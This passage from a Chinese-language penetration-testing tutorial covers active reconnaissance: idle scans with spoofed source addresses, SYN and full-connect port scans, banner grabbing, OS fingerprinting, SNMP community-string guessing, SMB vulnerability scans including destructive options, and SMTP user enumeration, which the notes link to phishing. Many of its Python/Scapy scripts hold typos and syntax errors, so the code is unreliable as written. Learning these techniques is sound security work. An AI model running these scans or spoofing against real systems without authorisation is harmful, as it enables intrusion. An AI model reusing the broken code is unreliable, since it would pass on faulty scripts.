​    条件二：必须要有一台僵尸机（这里的僵尸机与僵尸网络里的僵尸机进行区分：这里的僵尸机说的是：1.在网络中什么也不干，处于闲置状态，没有被别人控制。2.操作系统中的ipid必须是递增的，如果ipid是随机状态或者永远是0的状态的话【IP包头里面的identification字段】，近期的操作系统win10等等都是随机产生的，在早期xp，2003等都是递增的）</p>
</li>
<li>
<p>实现过程：（三方，判断被扫服务器那个端口是开放的）</p>
<ol>
<li>
<p>本地向僵尸机发送SYN+ACK的数据包(在没有建立三次握手的情况下)，僵尸机回访回一个RST包（正常情况下没有建立握手）给扫描器，通常情况下这个RST包中会有IPID（假设=X），扫描者就会收到IPID=X的信息。</p>
</li>
<li>
<p>第二步会向目标服务器发送一个SYN包请求，伪造源地址（因为不能透露本机IP，所以这里的IP地址为僵尸机的。也就是说对目标服务器来说，这个SYN包就来源于僵尸机，但实际上是由扫描者发送过来的）。</p>
<ol>
<li>如果这个端口为开放状态，那么目标服务器就会向僵尸机IP发送SYN+ACK包，但是这里对僵尸机来说，他是非常莫名其妙的就接收到了一个SYN+ACK数据包（没有建立连接），所以僵尸机就会返回一个RST（IPID=X+1）（这里为僵尸机闲置的原因，如果僵尸机没有足够闲置，那么IPID!=X+1，这里也是需要递增的原因）数据包给目标服务器。扫描者对目标服务器来说完全隐藏。</li>
<li>如果这个端口为关闭状态，那么目标服务器就会向僵尸机IP发送RST包，僵尸机器不会有任何反应。</li>
</ol>
</li>
<li>
<p>扫描者重复步骤一，发送SYN+ACK包。</p>
<ol>
<li>如果这个端口为开放状态，僵尸机返回RST包（IPID=X+2）。</li>
<li>如果这个端口为关闭状态，僵尸机返回RST包（IPID=X+1）。</li>
</ol>
</li>
</ol>
</li>
</ul>
<img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/Screenshot_2021_0510_202927.png" alt="Screenshot_2021_0510_202927" style="zoom:80%;" />
<img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210509190650.png" style="zoom:150%;" />
<h4 id="隐蔽端口扫描">隐蔽端口扫描</h4>
<p>过程1：主机主动发送syn——目标机发送syn/ack——主机自动发送rst</p>
<p>过程2：主机主动发送syn——目标机发送rst</p>
<h5 id="scapy-6">Scapy</h5>
<pre><code class="language-python">sr1(IP(dst=&quot;192.168.60.3&quot;)/TCP(flags=&quot;S&quot;,dport=80),timeout=1,verbose=1)
verbose=1显示详情信息，等于0则不显示

a.display()//查看返回的数据包

./syn_scan.py
#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*
import sys

if len(sys.argv)!=4:
 print &quot;Usage - ./syn_scan.py [Target-IP] [First Port] [Last Port]&quot;
 print &quot;Exanple - ./syn scan.py 10.0.0.5 1 100&quot;
 print &quot;Example will TCP SYN scan ports 1 through 100 on 10.0.0.5&quot;
sys.exit()

ip=sys.argv(1)
start=int(sys.argv([Z])
end=int(sys.argv[3])
 
for port in range(start,end):
 a=sr1(IP(dst=ip)/TCP(dport=port),timeout=1,verbose=0)
 if a == None:
  pass
 else:
  if int(a[TCP].flags) ==18:
   print port
  else:
   pass
       
# 18表示返回（SYN+ACK），可以在wireshark中查看
</code></pre>
<h5 id="nmap-5">nmap</h5>
<p>会做DNS解析，不是顺序发送</p>
<pre><code class="language-shell">nmap -sS 1.1.1.1 -p 80,21,25,110,443
# -sS，使用扫描，使用syn的方式扫描（默认方式）

nmap -sS 1.1.1.1 -p 1-65535 --open
# --open，当遇到某种情况，存在防火墙，返回除了open以外的情况时（close等等），可以使用--open来达到过滤的效果，只显示open的

nmap -sS 1.1.1.1 -p- --open 
# -p 1-65535=-p-

nmap -sS -iL iplist.txt -p 80,21,22,23
</code></pre>
<h5 id="hping3-2">hping3</h5>
<p>不做DNS解析，顺序发送</p>
<pre><code class="language-shell">hping3 

hping3 1.1.1.1 --scan 80 -S
# -S syn扫描

hping3 1.1.1.1 --scan 80,21,25,443 -S 
hping3 1.1.1.1 --scan 0-65535 -S 

hping3 -c 10 -S --spoof 1.1.1.2 -p ++1 1.1.1.3
# -c 10 -S 发送10个syn包
# --spoof 表示欺骗地址，伪造地址，接收不到回包，只能间接查看结果，在该欺骗地址的主机上
# -p ++1 从端口1开始扫描的端口依次发送10个包，到端口10
</code></pre>
<h4 id="全连接端口扫描">全连接端口扫描</h4>
<p>​	如果SYN扫描在某种特别严格的网络服务器上，或者有防火墙过滤，或是更特殊的情况下，无法探测目标端口的状态，就要使用全连接端口扫描。</p>
<p>​	因为这就是一种三次握手建立连接的一个比较正常的过程，如果能够建立连接，就表示目标端口开放，否则没有开放或是有更强的过滤机制。</p>
<p>​	结果准确，不隐蔽。</p>
<h5 id="scapy-7">scapy</h5>
<pre><code class="language-python">Scapy
• Syn扫描不需要raw packets
• ٖ内核认为syn/ack是非法包，直接发rst中断连接
• 全连接扫描对scapy来实现比较困难

原理与上面相同：
sr1(IP(dst=&quot;192.168.20.2&quot;)/TCP(dport=22,flags='S'))
</code></pre>
<pre><code class="language-python">./tcp_scan1.py 
#! /usr/bin/python
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import *

response=sr1(IP(dst=&quot;192.168.20.2&quot;)/TCP(dport=22,flags='S'))
reply=sr1(IP(dst=&quot;192.168.20.2&quot;)/TCP(dport=22,flags='A',ack=(response[TCP].seq+1)))
# response[TCP].seq+1:TCP序列号类似于IPID，这里作用是与上一个包形成序列，表示是一个完整的建立连接的过程。

问题：SYN--SYN+ACK--（RST）--ACK--RST
#操作系统内核会发送RST中断三次握手
</code></pre>
<pre><code class="language-python">./tcp_scan2.py
#! /usr/bin/python

import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all inport*

SYN = IP(dst=&quot;192.168.1.134&quot;)/TCP(dport=25,flags='s')

print &quot;--- SENT&quot;
SYN.display()

print &quot;\n\n-- RECEIVED --&quot;
response = srl(SYN,timeout=1,verbose=0)
response.display()

if int(response[TCP].flags)== 18:
 print &quot;\n\n-- SENT --&quot;
 A = IP(dst=&quot;192.168.1.134&quot;)/TCP(dport=25,flags='A',ack=(response[TCP].seq +1))
 A.display()
 print &quot;\n\n-- RECEIVED --&quot;
 response2=sr1(A,timeout=1,verbosea0)
 response2.display()
else:
 print&quot;SYN-ACK not returned&quot;

如何防止rst产生，从而建立正常的三次握手
答案：iptables -A OUTPUT -p tcp --tcp-flags RST RST -d 192.168.20.2 -j DROP
通过iptables（操作系统默认自带的防火墙）把内核产生的向目标及发送的RST包禁用掉。
-A OUTPUT 出栈
</code></pre>
<h5 id="nmap-6">nmap</h5>
<pre><code class="language-shell">nmap -sT 1.1.1.1 -p 80
nmap -sT 1.1.1.1 -p 80,21,25 
nmap -sT 1.1.1.1 -p 80-2000
# TCP全连接方式实现扫描,扫描速度略慢与SYN扫描

nmap -sT -iL iplist.txt -p 80 
# 不加-p参数则默认1000个常用端口
</code></pre>
<h5 id="dmitry">dmitry</h5>
<p>功能简单，使用比较简便。默认150个常用端口。还可以whois查询等等。</p>
<pre><code class="language-shell">• dmitry -p 172.16.36.135 
• dmitry -p 172.16.36.135 -o output

dmitry -h
</code></pre>
<h5 id="nc">nc</h5>
<pre><code>nc -nv -w 1 -z 192.168.60.4 1-100
• for x in $(seq 20 30); do nc -nv -w 1 -z 1.1.1.1 $x; done | grep open 
• for x in $(seq 1 254); do nc -nv -w 1 -z 1.1.1.$x 80; done
</code></pre>
<h4 id="僵尸扫描">僵尸扫描</h4>
<p>​	优先寻找一台僵尸机器（需要足够的闲置，操作系统的IPID为递增【XP，2003】，能实现源地址伪造）。</p>
<p>​	具体实现：</p>
<h5 id="scapy-8">scapy</h5>
<p>工具：</p>
<p>​	扫描者：Kail，僵尸机：XP，目标：Metasploitable2</p>
<pre><code class="language-shell">Scapy —— zombie.py 

# 要发送的包是TCP的包所以先要组合构造TCP包
i=IP()
t=TCP()

# 定义向僵尸机发送的数据包
rz=(i/t)

# 定义向目标机发送的数据包
rt=(i/t)

# 定义向僵尸机发送的包的包头的内容（包1）
# ip:字段目标地址
rz[IP].dst=&quot;IPz&quot;
# TCP:僵尸机定义的目标端口，必须是开放的，这样返回RST才能返回IPID
rz[TCP].dport=445
rz[TCP].flags=&quot;SA&quot;

# 定义向目标机发送的包的包头的内容（包2）
# ip:ip端需要填写的是要伪造的僵尸机的IP地址
# 伪造IP
rt[IP].src=&quot;IPz&quot;
# 目标IP
rt[IP].dst=&quot;IPt&quot;
# 扫描目标机器的端口
rt[TCP].dport=22
rt[TCP].flags=&quot;S&quot;

# 发包
# 向僵尸机发送包1
az1=sr1(rz)
# 向目标机发送包2
at=sr1(rt)
# 向僵尸机发送包1
az2=sr1(rz)

# 查看僵尸机回包的内容IPID的值，差值为2则开放，为1则关闭
az1.display()
az2.display()
</code></pre>
<pre><code class="language-python">zombie.py 

#!/usr/bin/python
import logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
from scapy.all import*

# 定义函数，在函数里面定义了一个变量：zombie僵尸机，僵尸机的IP地址作为变量来输入
# 判断一台电脑适不适合做一台僵尸机
def ipid(zombie):
 # 这里意思是要发送三个包，判断reply1和replay2的应答数据包的IP值，判断适不适合做僵尸机
 #函数里面定义变量replay1，发送包
 reply1 = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;).timeout=2,verbose=0)
 send(IP(dst=zombie)/TCP(flags=&quot;SA&quot;).verbose=0)
 #这里两条语句都是发包，区别就是sr1只接收1个应答数据包，send只发送，不接受
 reply2 = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;).timeout=2,verbose=0)
 if reply2[IP].id == (reply1[IP].id+2):
  print&quot;IPID sequence is incremental and target appers to be idle. ZOMBIE LOCATED&quot;
  response = raw_input(&quot;Do you want to use zombie to perform a scan? (Y or N):&quot;)
  if response == &quot;Y&quot;:
   target =raw_input(&quot;Enter the IP address of the target system:&quot;)
   zombiescan(target,zombie)
 else:
  print&quot;Either the IPID sequence is not incremental or the target is not idle. NOT A GOOD ZOHBIE&quot;

# 定义函数
def zombiescan(target,zomble):
 print&quot;\nScanning target &quot; + target + &quot; with zombie &quot; + zombie
 print&quot;\n------------------OPen Ports on Target------------------\n&quot;
 for port in range(1,100):
  try:
    # 定义发包，这里是TCP
   start_val = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;.dport=port),timeout=2.verbose=0)
   send(IP(src=zombie.dst=target)/TCP(flags=&quot;S&quot;.dport=port),verbose=0)
   end_val = sr1(IP(dst=zombie)/TCP(flags=&quot;SA&quot;),timeout=2,verbose0)
   if end_val[IP].id == (start_val[IP].id+2):
    print port
  except:
   pass

print &quot;------------------Zombie Scan Suite------------------\n&quot;
print &quot;1 - Identify Zombie Host\n&quot;
print &quot;2 - PerformZombie Scan\n&quot;
ans =raw_input(&quot;Select an Option (1 or 2):&quot;)
if ans ==&quot;1&quot;:
 zombie = raw_input(&quot;Enter IP address to test IPID sequence: &quot;) 
 ipid(zombie)
else:
 if ans ==&quot;2&quot;:
  zonbie = raw_input(&quot;Enter IP address for zombie system:&quot;)
  target = raw_input(&quot;Enter IP address for scan target:&quot;)
  zombiescan(target.zombie)
</code></pre>
<h5 id="nmap-7">nmap</h5>
<p>nmap也可以进行僵尸扫描，但是前提还是事先要发现一个僵尸机。nmap里面也有大量的脚本，我们可以调用nmap里面的脚本实现僵尸机的发现，看他是否满足一个僵尸机的条件。</p>
<pre><code>发现僵尸机
• nmap -p445 192.168.1.133 --script=ipidseq.nse
扫描目标
• nmap 172.16.36.135 -sI 172.16.36.134 -Pn -p 0-100
</code></pre>
<h2 id="阶段三服务扫描">阶段三：服务扫描</h2>
<p>​	经过了前两个阶段已经能发现存活的IP以及对应IP开放的端口，但是在这些端口中，可能存在一些协议服务，比如他是22端口，但是他并不是远程连接的服务，或者把其他的服务也开在了22端口上面，由此可见，我们并不能由发现的端口判断对应的服务。</p>
<p>​	所以现在就需要识别开放端口上运行的应用，服务及其版本。查到了版本之后，就可以到对应的官网上面去查找对应版本的漏洞，发掘利用方式。</p>
<p>​	识别目标操作系统，目的原理与上述相同。</p>
<p>​	收集到以上的信息就能够提高攻击的效率。</p>
<p>​	几种扫描服务的方法：</p>
<ol>
<li>
<p>Banner捕获<br>
主要，简单，不准确，连接一个应用端口，这时，该服务就会返回一些Banner信息，可以通过此来识别，但是这种信息可能是管理员持有者进行修改伪造的虚假信息，用来迷惑扫描者。</p>
</li>
<li>
<p>服务识别</p>
</li>
<li>
<p>操作系统识别<br>
服务和操作系统，可以使用更加准确的方法，像nmap，有大量脚本，可以进行CMS指纹识别。</p>
</li>
<li>
<p>SNMP分析（简单网络管理协议）<br>
SNMP配置不当，SNMP的端口开放也可能导致信息泄露，进行扫描，识别目标系统以及上面的软件，版本信息，因为SNMP是通过系统内部的信息来进行信息的探测和搜索，准确性比较高。</p>
</li>
<li>
<p>防火墙识别<br>
扫描判断防火前版本信息，来进行绕过。</p>
</li>
</ol>
<h3 id="banner">Banner</h3>
<p>​	首先通过Banner信息可以发现软件开发商信息，像Apache，微软等各种开发商开发的软件，以及软件的名称，软件的类型，比如tomcat，MySQL以及他们的版本，可以通过他们的版本号来进行定位目标存在怎样的漏洞，可以直接打入</p>
<p>​	要获取目标信息的Banner只能通过建立完整的连接。才能查看更准确的服务。</p>
<p>​	但是只是用Banner信息是不准确的，还需要使用另外一些方法进行验证，可以由特征行为和相应字段，指纹信息，不同的响应可用于识别底层操作系统（windows与Linux的ping包的区别）</p>
<h4 id="nc-2">nc</h4>
<pre><code class="language-shell">nc -nv 1.1.1.1 22
# 使用nc进行连接会进行banner信息的回显

get /（80端口）
# 获取更多信息
</code></pre>
<h4 id="socker">socker</h4>
<p>​	python的另外一个模块--socket。scapy最适用于网络上里面注入数据包的一个工具（主要是三四层网络包的劫持，嗅探，注入等等），如果建立网络应用连接scary缺乏对应用层数据包的支持（http，dns，ssh），对应用层数据包的支持不够完整，建立完整会话比较困难。</p>
<p>​	现在这里对网络应用，端口建立完整链接，再去进行应用层通信的话，使用scary已经不合适了，最经常使用python的下一个模块--socket，可以建立tcp连接，建立之后可以跟目标进行应用层会话的数据传输。</p>
<pre><code class="language-python">python的另外一个模块--socket，scapy最适用于网络上里面
Python socket

先进入python命令行

import socket 
# 导入socket模块，使用此进行连接的建立以及信息的获取。

# bangrab定义的一个变量（创建一个对象，这个对象以变量的命名的方式体现，他就可以使用socket里面的大部分的方法）建立socket连接的一个标准的格式。
bangrab = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
# socket.SOCK_STREAM表示建立的是一个tcp的连接。

# connect，socket里面的方法，连接目标
bangrab.connect((“1.1.1.1&quot;, 21)) 

# 接收数据（大小）
bangrab.recv(4096) 

返回的信息：'220 (vsFTPd 2.3.4)\r\n'

# 过程结束，关闭连接（connect）
bangrab.close() 
exit() 

Banner当不允许抓取时，recv函数无返回将被挂起
. /ban_grab.py 192.168.1.134 1 100
</code></pre>
<pre><code class="language-python">#!/usr/bin/python

import socket
import select
import sys

if len(sys.argv)=4:
 print&quot;Usage - ./banner_grab.py [Target-IP] [First Port] [Last Port]&quot;
 print&quot;Example /banner grab.py 10.0.0.5 1 100&quot;
 print&quot;Example will grab banners for TCP ports 1 through 100 on 10.0.0.5&quot;
 sys.exit()

ip=sys.argv[1]
start=int(sys.argv[2))
end= int(sys.argv[3])

for port in range(start,end):
 try:
  bangrab=socket.socket(socketAF_INET,socket.SOCK_STREAM)
  bangrab.connect((ip,port))
  
  如果超时时间是一的话，ready就是select返回的结果
  ready = select.select([bangrab].[].[].1)
  如果超时时间是零的话，打印返回的结果
  if ready[0]:
   print&quot;TCP Port &quot;+str(port)+&quot;.&quot;+ bangrab.recv[4096]
   每显示一个端口都要进行close关闭连接,否则会进行产生大量的TCP连接
   bangrab.close()
 except:
  pass
</code></pre>
<h4 id="dmitry-2">dmitry</h4>
<pre><code class="language-shell">dmitry -p 172.16.36.135 
dmitry -pb 172.16.36.135
</code></pre>
<h4 id="namp">namp</h4>
<pre><code class="language-shell">nmap -sT 1.1.1.1 -p 22 --script=banner.nse
# 通过使用banner脚本来实现banner信息的发现
-sT 完整的TCP连接，banner信息获取的必要条件。
-p表示端口，可以用范围来表示

# 在此目录下面发现更多的扫描脚本，使用Lua语言编写
cd /usr/share/nmap/scripts/
ls
</code></pre>
<p>​	nmap还能够根据响应特征分析发现识别服务，有一个丰富的特征库signature，扫描结果更加准确</p>
<pre><code class="language-shell">nmap 1.1.1.1 -p 80 -sV
# -sV 识别端口后面跑服务，基于指纹特征匹配的方式
</code></pre>
<h4 id="amap">amap</h4>
<p>专门用来发现端口后面跑的是什么服务的一种工具，但是结果还是比较粗略</p>
<pre><code class="language-shell">amap -B 172.16.36.135 21 
amap -B 172.16.36.135 1-65535 
amap -B 172.16.36.135 1-65535 | grep on

# -B 参数：专门用来发现指定端口下面的Banner的信息，还有其他发现服务的方式
# grep on 过滤开放着的
</code></pre>
<pre><code class="language-shell">amap 192.168.1.134 80 
amap 172.16.36.135 20-30 
amap 172.16.36.135 20-30 –q 
amap 172.16.36.135 20-30 -qb

# -q ：不只是banner信息，但是结果比较乱，所以加上-q参数
# -b ：更加详细准确
</code></pre>
<h3 id="操作系统识别">操作系统识别</h3>
<p>​	扫描端口服务的目的是发现应用版本，之后可以通过应用的版本信息来判断版本上面是否存在漏洞。</p>
<p>​	这里扫描操作系统的目的与扫描端口后面的服务的目的基本上相同。</p>
<p>​	操作系统安装之后，无论什么操作系统，上面都会默认开放一些服务，端口。通过扫描操作系统的版本，就可以了解操作系统上默认开放的端口以及服务，了解一些旧的版本的漏洞，利用操作系统本身自带的漏洞也可以进入目标的操作系统。</p>
<p>​	识别扫描操作系统的原理，最简单的一种说法，扫描--TTL值来进行识别，理论上来说各种操作系统的默认的TTL的值是不同的，从以下的值的范围值来判断，不免会有出现TTL值的修改的情况。</p>
<p>​	Windows ：128(65——128)，起始TTL值：128。如果win作为服务器来说，每经过一个路由器，他的TTL的值会被减一。所以根据这点来说，数据包发送的目标地址，在目标主机上通过抓取目标机上收到的TTL值可以判断源地址到目标地址中间经过几条路由器。在这之前有路由追踪的方式，通过设置TTL值，逐个变化来判断经过了哪些路由器，路由器的接口上面的IP地址是多少。</p>
<p>​	Linux / Unix ： 64 (1-64)</p>
<p>​	某些Unix ：255</p>
<h4 id="主动式扫描">主动式扫描</h4>
<h5 id="scapy-9">scapy</h5>
<pre><code class="language-python">python 脚本逻辑判断：
# 导入scapy
from scapy.all import *

# 定义IP
win=&quot;1.1.1.1&quot;
linu=&quot;1.1.1.2&quot;

# 分别向win和linux发包，根据TTL值进行判断
aw=sr1(IP(dst=win)/ICMP())
al=sr1(IP(dst=linu)/ICMP())
if al[IP].ttl&lt;=64:
print &quot;host is Linux&quot;
else:
print &quot;host is windows&quot;
</code></pre>
<pre><code>#!/usr/bin/python
from scapy.all import*
import Logging
logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)
import sys

if len(sys.argv)!=2:
 print&quot;Usage - ./ttl_os.py [IP Address]&quot;
 print&quot;Example - ./ttl_os.py 10.0.0.5&quot;
 print&quot;Example will perform ttl analysis to attempt to determine whether the system is Windows or Linux/Unix
 sys.exit()

ip =sys.argv[1]

# 发ICMP的包进行回包，如果回包没有取得，目标系统不存在或者网络系统不在线，就显示“无响应”
ans=sr1(IP(dst=str(ip))/ICMP().timeout=1,verbose=0)
if ans == None:
 print &quot;No response was returned&quot;

# 否则主机是 Linux/Unix，否则是win系统
elif int(ans[IP].ttl)&lt;=64:
 print &quot;Host is Linux/Unix&quot;
else:
 print &quot;Host is Windows&quot;
</code></pre>
<h5 id="nmap-8">nmap</h5>
<pre><code># 能够使用多种技术识别操作系统
nmap 1.1.1.1 -O
-O 判断操作系统具体版本

# 不知扫出了win 还显示为XP
# 通过匹配CPE的设备类性 国际标准化组织制定了一套标准，标准会把每种类型的操作系统，软件硬件等等都会进行一个CPE的一个编号，通过CPE的编号判断具体是一个怎样的系统。
</code></pre>
<h5 id="xprobe2">xprobe2</h5>
<p>专门用来识别目标操作系统的一种工具</p>
<pre><code>xprobe2 1.1.1.1
# 进行的扫描过程：ping，抓ttl，端口扫描，进行tcmp的特征判断，指纹信息（tcp，smb，snmp）等等，最后得出结论，猜出的范围比较广，但是不准确
</code></pre>
<h4 id="被动式扫描">被动式扫描</h4>
<p>​	主动式扫描，扫描者向目标发包，之后根据被扫者的特征进行判断。</p>
<p>​	被动式扫描，与主动式刚好对应，不主动发包，基于网络抓包（eg：win linux的ping包的不同），网络监听的原理。被动式扫描，可以部署在网络出口的地方，凡是有进出网络的数据包，有外部主机的通信，有数据包访问的时候，可以抓包，或者通过交换机做镜像端口，或者通过地址欺骗进行抓包，从而让信息流入到主机IP上，开着被动扫描分析的软件，通过这个软件分析收到的包，通过包里的信息进行判断，分别是什么操作系统。</p>
<h5 id="p0f">p0f</h5>
<p>​	使用简单，输入p0f之后就开始工作，每发送出去数据包，回收进来的数据包他就会进行监听，只要监听到有数据包，他就会根据数据包来判断目标IP操作系统类型。可以结合ARP地址欺骗识别全网OS。</p>
<h3 id="snmp扫描">SNMP扫描</h3>
<p>​	他是信息的金矿，可以查看非常详细的配置内容，同时也是网络管理员配置起来最最最容易疏漏的一项服务，因为一般管理员配置信息只要认为配置通了就可以了，但是还不行，SNMP里面有一个community，包括像服务中思科交换机的默认的Community strings，类似于SNMP的默认密码的一种机制，默认情况下SNMP有两个Community也会有默认的值，一个是public（win和Linux都是）默认只读，默认情况下所有的网络设备和操作系统都会使用这个密码，身份验证信息；一个是private是可读可写的。public权限可以拥有进行查看SNMP配置的权限，private可以进行SNMP配置的更改操作（信息查询或重新配置）。</p>
<p>​	如果管理员的安全意识不强，没有更改Community的默认设定，如果只想查询目标机器的信息，默认情况下的默认配置，无论是windows还是Linux配置里面都会使用public作为communtity，如果管理员的安全意识不强，没有更改Community的默认设定，还是public的设定的话，那么任何人都可以使用SNMP的扫描工具，客户端工具，去用public连接目标设备，从而获取目标机器的非常全面的目标信息。如果是private甚至可以修改目标的配置信息。此为还有一些非标准，但管理员常用的特征字符：admin，manager等等（字典）。</p>
<p>​	简单网络管理协议（SNMP），通信所走的UDP的161、162两个端口，snmp服务端（信息被查询被管理端使用的是161端口），snmp客户端（使用的是162端口）。与DHCP协议相似，主机获取IP地址的DHCP协议，DHCP也是基于UDP协议之上的一种应用层的协议(服务端:67、客户端:68)。</p>
<p>​	SNMP是在网络拥有一定规模的时候，进行人工手动的网络监控以及管理就难以实现，并且效率很低。所以出现了SNMP协议的监控机制，通过SNMP协议，监控网络交换机，服务器，防火墙像CPU运行情况，内存运行情况，并发连接数，带宽使用情况等等一些系统的内部信息。几乎很少有一些需求，用SNMP监控不到的。</p>
<p>​	国际标准化组织制定了一个通用的SNMP的管理信息库--MIB Tree(SNMP Managerment information Base)，是一种树形的网络设备管理功能数据库。里面定义了SNMP的通用标准，规定了对应发送指令(编号1.3.6.1.4.1.77.1.2.25)来查询对应的信息，SNMP收到此编号之后就会把相应的数据显示出来。基于此库，可以查一些常用的操作系统或者网络设备里面的信息（通过客户端导入标准库）。</p>
<p>​	SNMP的安装：win+R搜索，打开添加删除程序（appwiz.cpl），在添加组件一栏单击，找到管理和组件工具，将看到的（基于wmi对SNMP查询的程序）SNMP提供程序和简单网络管理协议打钩，单击确定即可安装。安装之后在操作系统的win+R中打开服务（services.msc），可以看到多出了两项SNMP的服务，在SNMP service中，代理一栏可以添加设备进行管理。陷阱一栏设置之后，机器就会成为SNMP的客户端，之后可以向SNMP的服务端进行连接，发送SNMP的信息。安全一栏可以查看Community的默认设定，默认为public，默认情况下是来自任何主机的连接查询请求，需要进行设置，只接受来自手动指定的主机的请求。</p>
<p>​	SNMP的传输是进行明文传输的，可以通过嗅探的方式来进行查找community信息。</p>
<h4 id="onesixtyone">onesixtyone</h4>
<pre><code class="language-shell">onesixtyone 1.1.1.1 public 
# 比nmap扫描的信息要多

onesixtyone -c dict.txt -i hosts -o my.log -w 100
# 如果上一个不能进行扫描，可能是管理员指定修改了public。
# -c 指定一个字典（community）的
# -i 指定主机，多个

dpkg -L onosixtyone
# 查看默认字典
</code></pre>
<h4 id="snmpwalk">snmpwalk</h4>
<pre><code class="language-shell">snmpwalk 192.168.20.199 -c public -v 2c 
# -v 指定communtiy的版本信息，v1 v2c v3
# v3加入了很多安全机制，加密机制，身份验证机制
# 硬件架构，操作系统，用户名，mac地址，IP地址，子网掩码，存在通信的网络机器的IP，系统时间，硬盘序列号，虚拟内存，物理内存大小，本地网卡等等，meb库id号，系统目录，网络服务，安装的软件，系统进程，

snmpwalk -c public -v 2c 1.1.1.1 1.3.6.1.4.1.77.1.2.25
# 可以查询oid，（当前系统所有账号）
</code></pre>
<h4 id="snmpcheck">snmpcheck</h4>
<pre><code class="language-shell">snmpcheck -t 192.168.20.199 
snmpcheck -t 192.168.20.199 -c private -v 2 
snmpcheck -t 192.168.20.199 -w
# 可读性比较好 默认为public，
# 硬件架构，开机时间，SNMP后台运行时间，联系人home，工作组，硬盘设备，磁盘信息，进程信息，网络信息等等
</code></pre>
<h3 id="smb扫描">SMB扫描</h3>
<p>​	SMB协议（Server Message Block）服务器消息块，微软开发使用最广的协议，微软历史上出现安全问题最多的协议，实现起来比较复杂，服务默认开放（文件共享）使用-- ip就可以访问到目标系统的默认文件。</p>
<p>​	早期存在一个漏洞（SMB1）——空会话未身份认证访问。建立空会话连接，获取目标系统上面的重要的信息。所谓的空会话就是在不使用账号密码的情况下与目标建立空连接，从而获取到目标系统的（密码策略，用户名，组名，机器名，用户，组SID等等信息），当可以获取到SID时，即使把超级用户administrators跟改为ABCD等用来迷惑其他黑客，但是它也可以轻松的识别改名之后的，因为administrators默认SID信息为500。包括现在的（SM08-067）经典漏洞。</p>
<figure data-type="image" tabindex="1"><img src="https://gitee.com/qu-xiaolei001/pic/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210516154850.png" alt="" loading="lazy"></figure>
<h4 id="nmap-9">nmap</h4>
<p>​	SMB经常使用两个端口，一个是139端口，一个是445端口，老版本经常使用139端口，新版本经常使用445端口</p>
<p>​	扫描主机如果出现了一种情况，发现从1-255所有的主机的端口都是打开着的并且都显示filtered，filtered表示可能是由于防火墙的过滤，或是其他的过滤机制，但是我这里的问题是使用了NAT模式，需要更改为桥接模式，桥接到无线网卡上面，重启。</p>
<pre><code class="language-shell">nmap -v -p139,445 192.168.60.1-20 --open
# 扫描端口是否开放，-v参数是显示更加详细的信息
# --open 查看开放端口的主机
# 问题：扫描比较粗糙，139以及445虽然是win下的默认开放的端口，但是如果是在linux上面安装了某些服务，Linux也会开放139以及445端口，所以单单依据开放139以及445端口就判断操作系统是win就有一些粗糙了

nmap 192.168.60.4 -p139,445 --script=smb-os-discovery.nse
# 进一步高级扫描方式，脚本，对win的smb协议进行大量的探测会扫描出很多的结果，很多的服务信息。

nmap -v -p139,445 --script=smb-check-vulns --script-args=unsafe=1 1.1.1.1
# 判断139 以及445是否存在漏洞
# --script=smb-check-vulns：检查smb存在的漏洞
# --script-args=unsafe=1：进行操作系统破坏性的扫描
# --script-args=safe=1：进行操作系统安全性的扫描
# 加上-Pn参数：对方即使开了防火墙也会去做扫描
</code></pre>
<h4 id="nbtscan">nbtscan</h4>
<pre><code class="language-shell">nbtscan -r 192.168.60.0/24 
nbtscan -h
# -r：使用本地端口137进行扫描，本地端口137兼容性好，甚至可以兼容win95，win98操作系统
# 好处：在局域网下，（ARP扫）假如是192.168.1的网段，去扫192.168.2的网段，可能扫描出网段的mac地址。跨网段扫描mac地址
</code></pre>
<h4 id="enum4liunx">enum4liunx</h4>
<pre><code class="language-shell">enum4linux -a 192.168.60.10
# 不支持大范围扫描
# 用户名，工作组，信息比较多，支持建立空连接
</code></pre>
<h3 id="smtp扫描">SMTP扫描</h3>
<p>​	主要发现目标系统的邮件账号，被动信息也可以。扫描主要是用来社会工程学，发送钓鱼邮件等等。</p>
<p>​	SMTP走的是25端口，可以使用nc进行连接。</p>
<h4 id="nc-3">nc</h4>
<pre><code class="language-shell">• nc -nv 1.1.1.1 25 
	• VRFY root
	# 确认有没有root账号
</code></pre>
<h4 id="nmap-10">nmap</h4>
<p>​	前提是已经做了端口扫描，并且发现25端口开放</p>
<pre><code class="language-shell">• nmap smtp.163.com -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY} 
# 扫描脚本smtp枚举用户，后面是指定使用的方式，扫描用户账号

• nmap smtp.163.com -p25 --script=smtp-open-relay.nse
# 扫描用户账号
</code></pre>
<h4 id="smtppy">smtp.py</h4>
<pre><code class="language-python">• smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1 
# 扫描用户账号，加上字典参数 -U
• ./smtp.py
</code></pre>
<p>​	另一个重要的概念：SMTP的开放中介。除了扫描用户之外，扫描开放中介。一般邮件服务器只能给开放账号的人发送邮件，（经过审核身份，身份验证）。早期SMTP服务以及一些软件，存在配置不当的情况下，可能打开了开放中介的功能。弊端：所有人都可能使用此邮件服务器去给别人发送邮件，可能出现一个黑客，使用你的邮件服务器去给别人发送一个钓鱼邮件，你的邮件服务器在这个过程中扮演了黑客的肉机的角色，攻击别人的一个中介的手段（open-relay）。可能发送病毒邮件，钓鱼邮件如果最后触犯了法律，最后追踪下来可能是你的邮件地址，造成一些问题。</p>
<pre><code class="language-python">#!/usr/bin/python

import socket
import sys

if len(sys,argv)!=2:
 print &quot;Usage:smtp.py &lt;username&gt;&quot;
 sys.exit(0)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.20.5',25))
# 先建立s对象，之后socket进行tcp连接
